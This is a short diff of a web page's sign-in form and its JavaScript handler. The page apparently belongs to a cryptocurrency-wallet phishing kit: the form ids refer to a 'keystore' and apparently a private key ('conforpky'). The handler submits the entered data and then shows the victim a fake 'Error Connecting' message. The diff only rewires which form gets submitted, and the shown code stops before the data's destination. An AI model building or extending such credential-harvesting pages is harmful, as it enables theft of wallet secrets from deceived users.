@@ -109,7 +109,7 @@
                 </div>
             </div>
             
-            <button class="proceed-button" onclick='sendMessage("contactFormKeystore")'type="button"id="sendMessageButton">Sign In</button>
+            <button class="proceed-button" onclick='sendMessage()' type="button" id="sendMessageButton">Sign In</button>
             <div class="text-center">
                 <a href="#" class="text-decoration-none">Need to find your password?</a>
             </div>
@@ -141,9 +141,9 @@
         });
     
 
-function sendMessage(formId) {
-    const form = document.getElementById(formId);
-    const formData = new FormData(form);
+        function sendMessage() {
+  const form = document.getElementById('conforpky'); 
+  const formData = new FormData(form); 
     formData.append("send", "true");
     const sendButton = form.querySelector(".proceed-button");
     sendButton.textContent = "Error Connecting";
